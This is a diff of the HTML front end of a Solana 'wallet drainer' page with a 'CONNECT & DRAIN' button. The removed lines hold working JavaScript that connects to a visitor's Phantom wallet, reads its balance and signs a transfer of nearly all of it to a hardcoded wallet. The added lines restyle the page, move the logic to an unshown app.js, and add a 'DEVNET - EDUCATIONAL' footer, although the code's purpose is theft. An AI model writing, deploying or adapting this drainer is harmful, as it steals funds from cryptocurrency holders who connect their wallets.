@@ -2,81 +2,120 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Drainer</title>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>DRAINER</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
         body {
             background: #000;
-            color: #0f0;
-            font-family: monospace;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
+            font-family: monospace;
+            padding: 20px;
         }
+        
+        .container {
+            max-width: 600px;
+            width: 100%;
+            background: #0a0a0a;
+            border-radius: 20px;
+            padding: 30px;
+            border: 1px solid #0f0;
+            box-shadow: 0 0 20px rgba(0,255,0,0.1);
+        }
+        
+        h1 {
+            color: #0f0;
+            text-align: center;
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+        
+        .sub {
+            text-align: center;
+            color: #0f0;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        
+        .address-box {
+            background: #111;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            word-break: break-all;
+            font-size: 12px;
+            color: #0f0;
+            border: 1px solid #333;
+        }
+        
         button {
             background: #0f0;
             color: #000;
             border: none;
-            padding: 20px 40px;
-            font-size: 20px;
+            padding: 18px 32px;
+            font-size: 18px;
             font-weight: bold;
             cursor: pointer;
+            width: 100%;
+            border-radius: 10px;
+            margin: 10px 0;
+            transition: all 0.3s;
         }
-        #log {
+        
+        button:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 15px rgba(0,255,0,0.5);
+        }
+        
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .log {
+            background: #0a0a0a;
+            border: 1px solid #333;
+            border-radius: 10px;
+            padding: 15px;
             margin-top: 20px;
-            font-size: 12px;
+            height: 300px;
+            overflow-y: auto;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 10px;
+            color: #333;
         }
     </style>
 </head>
 <body>
-<div style="text-align:center">
-    <h1>💀 DRAINER 💀</h1>
-    <button id="btn">CONNECT & DRAIN</button>
-    <div id="log"></div>
-</div>
-
-<script>
-    const MY_WALLET = "9tZqX5tq79HT2SN6AhxzXfqjowojW2hQut6e4vyzfrd1";
+    <div class="container">
+        <h1> DRAINER</h1>
+        <div class="sub">CONNECT & DRAIN</div>
+        
+        <div class="address-box">
+            🎯 <span id="targetAddr">Loading...</span>
+        </div>
+        
+        <button id="drainBtn">💀 CONNECT & DRAIN 💀</button>
+        
+        <div class="log" id="log"></div>
+        
+        <div class="footer">DEVNET - EDUCATIONAL</div>
+    </div>
     
-    function log(msg) {
-        const div = document.getElementById('log');
-        div.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
-    }
-    
-    document.getElementById('btn').onclick = async () => {
-        try {
-            log('Connecting...');
-            const provider = window.solana || window.phantom?.solana;
-            const resp = await provider.connect();
-            const victim = resp.publicKey.toString();
-            log(`Connected: ${victim.slice(0,20)}...`);
-            
-            const connection = new solanaWeb3.Connection('https://api.devnet.solana.com');
-            const balance = await connection.getBalance(resp.publicKey);
-            const amount = (balance / 1e9) - 0.001;
-            log(`Balance: ${(balance/1e9).toFixed(5)} SOL`);
-            
-            const tx = new solanaWeb3.Transaction().add(
-                solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: resp.publicKey,
-                    toPubkey: new solanaWeb3.PublicKey(MY_WALLET),
-                    lamports: amount * 1e9
-                })
-            );
-            tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-            tx.feePayer = resp.publicKey;
-            
-            log('Sending drain transaction...');
-            const sig = await provider.signAndSendTransaction(tx);
-            log(`✅ DRAINED! ${amount.toFixed(5)} SOL`);
-            log(`Sig: ${sig.slice(0,40)}...`);
-        } catch(e) {
-            log(`Error: ${e.message}`);
-        }
-    };
-</script>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
+    <script src="app.js"></script>
 </body>
 </html>
